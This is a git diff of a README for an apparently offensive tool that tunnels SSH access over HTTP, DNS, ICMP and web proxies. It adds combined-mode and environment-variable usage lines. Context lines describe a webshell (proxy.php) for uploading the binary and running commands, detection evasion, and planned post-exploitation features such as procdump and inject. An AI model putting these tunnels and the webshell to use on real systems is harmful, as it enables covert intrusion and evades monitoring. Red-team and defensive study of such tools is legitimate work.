@@ -26,7 +26,8 @@ sudo docker build . --output .
 sudo docker build . --platform arm64 --output . 
 ```
 
-You can edit Dockerfile to change build options
+You can edit Dockerfile to change build options.
+
 
 ## Usage 
 
@@ -149,6 +150,27 @@ You can edit proxy_cli.py script to specify proxies.
 ssh -o ProxyCommand='python proxy_cli.py http://127.0.0.1:8080/proxy.php EncryptionKey 2>/dev/null' a@a -i ../../keys/CLIENT 
 ```
 
+
+### Combined mode
+
+A combined tunnel have been implemented to bring every previous tunnel to a single binary.
+It is possible to choose between the different tunneling mode by using the MODE=<tunnel_name>. 
+
+
+
+## Environment Variable configuration
+
+If built in dynamic mode, most tunnels support configuration through environment variables:
+```
+MODE=http_enc ./sshd 
+MODE=sock REMOTE=127.0.0.1 PORT=8090 ./sshd #direct connect to 8090
+MODE=proxysock REMOTE=127.0.0.1 PORT=8090 http_proxy=http://proxy.lan:8080 ./sshd #Connect through webproxy
+MODE=dns REMOTE=<TLD> ./sshd #use the DNS tunneling to TLD domain
+MODE=icmp REMOTE=127.0.0.1 ./sshd #use icmp tunneling
+```
+
+
+
 #### Side notes about http Encapsulation
 1) Proxy.php is a minimal webshell, you can use it to upload sshd to the server and run commands. proxy_cli.py offers --run and --drop options to do so.
 
@@ -243,7 +265,6 @@ Examples:
   - HTTP Encapsulation (First step through http_enc and proxy.php : add JSP and other programs ) 
   - Userland TCP/IP Stack with raw sock ?
   - ICMP : Xor/Encrypt string to avoid detection in case of network analysis 
-  - Dynamic mode, packaging every tunnel and reconfigurable
   - Subsystem for post exploitation: 
 	- Procdump
 	- inject 
